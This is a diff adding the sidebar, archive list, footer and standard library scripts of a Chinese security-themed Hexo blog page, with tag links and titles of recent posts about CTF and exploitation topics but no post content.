+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">2</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/mongodb/">
+                        <span class="level-start">
+                            <span class="level-item">mongodb</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/office/">
+                        <span class="level-start">
+                            <span class="level-item">office</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">3</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/pwn/">
+                        <span class="level-start">
+                            <span class="level-item">pwn</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/web3/">
+                        <span class="level-start">
+                            <span class="level-item">web3</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/windows/">
+                        <span class="level-start">
+                            <span class="level-item">windows</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/writeup/">
+                        <span class="level-start">
+                            <span class="level-item">writeup</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/xammpp/">
+                        <span class="level-start">
+                            <span class="level-item">xammpp</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/xdebug/">
+                        <span class="level-start">
+                            <span class="level-item">xdebug</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/爬虫绕过/">
+                        <span class="level-start">
+                            <span class="level-item">爬虫绕过</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/百度云/">
+                        <span class="level-start">
+                            <span class="level-item">百度云</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/笔记/">
+                        <span class="level-start">
+                            <span class="level-item">笔记</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+            </ul>
+        </div>
+    </div>
+</div>
+        
+        </div>
+    
+</div>
+
+                
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only has-order-3 column-right">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            最新文章
+        </h3>
+        
+        <article class="media">
+            
+            <a href="/2018/11/pie-bypass-overwrite-dup2/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="bypass pie use partial overwrite and dup2">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-23T08:47:56.000Z">2018-11-23</time></div>
+                    <a href="/2018/11/pie-bypass-overwrite-dup2/" class="has-link-black-ter is-size-6">bypass pie use partial overwrite and dup2</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/got-plt-study/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="got/plt表学习">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-21T14:47:56.000Z">2018-11-21</time></div>
+                    <a href="/2018/11/got-plt-study/" class="has-link-black-ter is-size-6">got/plt表学习</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/seccon2018-web-writeup/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="SECCON 2018 GhostKingdom writeup">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-01T03:47:56.000Z">2018-11-01</time></div>
+                    <a href="/2018/11/seccon2018-web-writeup/" class="has-link-black-ter is-size-6">SECCON 2018 GhostKingdom writeup</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/10/Nginx-nodejs-socket/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="【笔记】部署nodejs+socket.io+nginx (https)">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-10-12T08:47:56.000Z">2018-10-12</time></div>
+                    <a href="/2018/10/Nginx-nodejs-socket/" class="has-link-black-ter is-size-6">【笔记】部署nodejs+socket.io+nginx (https)</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/10/oracle-sqli-get-shell/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Oracle 从sqli到get (root) shell">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-10-02T08:47:56.000Z">2018-10-02</time></div>
+                    <a href="/2018/10/oracle-sqli-get-shell/" class="has-link-black-ter is-size-6">Oracle 从sqli到get (root) shell</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+    </div>
+</div>
+
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            归档
+        </h3>
+        <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/11/">
+                <span class="level-start">
+                    <span class="level-item">十一月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">3</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/10/">
+                <span class="level-start">
+                    <span class="level-item">十月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/09/">
+                <span class="level-start">
+                    <span class="level-item">九月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">5</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/06/">
+                <span class="level-start">
+                    <span class="level-item">六月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/05/">
+                <span class="level-start">
+                    <span class="level-item">五月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/04/">
+                <span class="level-start">
+                    <span class="level-item">四月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/03/">
+                <span class="level-start">
+                    <span class="level-item">三月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">14</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/02/">
+                <span class="level-start">
+                    <span class="level-item">二月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/01/">
+                <span class="level-start">
+                    <span class="level-item">一月 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">3</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/12/">
+                <span class="level-start">
+                    <span class="level-item">十二月 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">6</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2017/11/">
+                <span class="level-start">
+                    <span class="level-item">十一月 2017</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">9</span>
+                </span>
+            </a>
+        </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                标签
+            </h3>
+            <ul class="menu-list">
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/BlockChain/">
+                        <span class="level-start">
+                            <span class="level-item">BlockChain</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/CTF/">
+                        <span class="level-start">
+                            <span class="level-item">CTF</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">12</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/CVE/">
+                        <span class="level-start">
+                            <span class="level-item">CVE</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">3</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/Hack/">
+                        <span class="level-start">
+                            <span class="level-item">Hack</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/Oracle/">
+                        <span class="level-start">
+                            <span class="level-item">Oracle</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/bypass-pie/">
+                        <span class="level-start">
+                            <span class="level-item">bypass pie</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/kali/">
+                        <span class="level-start">
+                            <span class="level-item">kali</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">2</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/mongodb/">
+                        <span class="level-start">
+                            <span class="level-item">mongodb</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/office/">
+                        <span class="level-start">
+                            <span class="level-item">office</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">3</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/pwn/">
+                        <span class="level-start">
+                            <span class="level-item">pwn</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/web3/">
+                        <span class="level-start">
+                            <span class="level-item">web3</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/windows/">
+                        <span class="level-start">
+                            <span class="level-item">windows</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/writeup/">
+                        <span class="level-start">
+                            <span class="level-item">writeup</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/xammpp/">
+                        <span class="level-start">
+                            <span class="level-item">xammpp</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/xdebug/">
+                        <span class="level-start">
+                            <span class="level-item">xdebug</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/爬虫绕过/">
+                        <span class="level-start">
+                            <span class="level-item">爬虫绕过</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/百度云/">
+                        <span class="level-start">
+                            <span class="level-item">百度云</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+                <li>
+                    <a class="level is-marginless" href="/tags/笔记/">
+                        <span class="level-start">
+                            <span class="level-item">笔记</span>
+                        </span>
+                        <span class="level-end">
+                            <span class="level-item tag">1</span>
+                        </span>
+                    </a>
+                </li>
+                
+            </ul>
+        </div>
+    </div>
+</div>
+    
+    
+</div>
+
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    <img src="/images/logo.svg" alt="Junay的博客" height="28">
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2018 Junay&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        href="http://github.com/ppoffice/hexo-theme-icarus">Icarus</a>
+                </p>
+            </div>
+            <div class="level-end">
+            
+                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
+                
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Creative Commons" href="https://creativecommons.org/">
+                        
+                        <i class="fab fa-creative-commons"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
+                        
+                        <i class="fab fa-creative-commons-by"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Download on GitHub" href="https://github.com/delcoding">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                </p>
+                
+                </div>
+            
+            </div>
+        </div>
+    </div>
+</footer>
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("zh-CN");</script>
+
+
+    
+    
+    
+    <script src="/js/animation.js"></script>
+    
+
+    
+    
+    
+    <script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+    <script src="/js/gallery.js" defer></script>
+    
+
+    
+    
+
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {matchFontHeight: false},
+        SVG: {matchFontHeight: false},
+        CommonHTML: {matchFontHeight: false}
+    });
+});
+</script>
+
+    
+    
+
+<a id="back-to-top" title="回到顶端" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+    
+
+
+<script src="/js/main.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(无标题)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+</body>
+</html>
